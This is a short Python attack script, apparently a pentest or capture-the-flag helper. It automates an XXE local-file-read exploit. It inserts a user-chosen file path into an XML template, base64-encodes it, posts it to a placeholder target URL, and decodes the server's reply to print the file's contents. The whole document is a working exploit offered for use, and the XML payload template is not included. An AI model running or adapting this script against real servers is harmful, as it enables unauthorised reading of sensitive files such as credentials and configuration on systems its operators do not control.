#!/usr/bin/env python3
import requests,os,base64,urllib.parse
from bs4 import BeautifulSoup

url ="<CHANGE_URL>"
#proxies = {'http':'http://localhost:8080'}
proxies = {}

def lfi(payload):

    data = {'data' : payload}
    req = requests.post(url=url,data=data,proxies=proxies)
    soup =  BeautifulSoup(req.text,'lxml')
    tr = soup.find("tr")
    td_list = tr.find_all("td")
    print(base64.b64decode(td_list[1].text).decode("utf-8"))


def build_xxepayload():
    file_to_read = input("enter file to read: ")
    while file_to_read != "":
        fin = open("template.xml","rt")
        fout = open("out.xml","wt")
        for line in fin:
            fout.write(line.replace('archivo', file_to_read))
        fout.close()
        with open("out.xml", "rb") as file:
            encodedb64 = base64.b64encode(file.read())
        lfi(encodedb64)
        fin.close()
        file_to_read = input("enter file to read: ")
    
def main():
    build_xxepayload()

if __name__ == '__main__':
    main()
